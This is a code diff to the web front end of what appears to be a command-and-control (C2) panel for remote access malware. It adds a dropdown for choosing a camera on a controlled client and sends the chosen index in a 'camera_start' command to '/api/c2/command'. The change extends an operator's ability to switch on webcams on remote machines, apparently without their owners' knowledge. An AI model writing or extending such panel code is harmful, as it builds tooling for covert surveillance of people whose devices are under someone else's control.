@@ -627,6 +627,16 @@
                             <span id="cam-quality-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:36px;">60%</span>
                         </div>
 
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">Device</label>
+                            <select id="cam-select" style="background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);color:var(--text-main);padding:6px 12px;border-radius:6px;font-size:12px;outline:none;">
+                                <option value="0">Camera #0 (Auto / Main)</option>
+                                <option value="1">Camera #1</option>
+                                <option value="2">Camera #2</option>
+                                <option value="3">Camera #3</option>
+                            </select>
+                        </div>
+
                         <span id="cam-status" style="font-size:12px;color:var(--text-muted);margin-left:auto;">Stopped</span>
                     </div>
                 </div>
@@ -1055,15 +1065,18 @@
             }
         }
 
+        const camSelect = document.getElementById('cam-select');
+
         camToggleBtn.addEventListener('click', async () => {
             if (!camRunning) {
                 const fps = parseInt(camFpsSlider.value) || 10;
                 const quality = camQualitySlider.value;
+                const camIdx = camSelect ? camSelect.value : 0;
                 try {
                     await fetch('/api/c2/command', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ client_id: clientId, command: 'camera_start:' + fps + ':' + quality })
+                        body: JSON.stringify({ client_id: clientId, command: 'camera_start:' + fps + ':' + quality + ':' + camIdx })
                     });
                     camRunning = true;
                     camLastTs = 0;
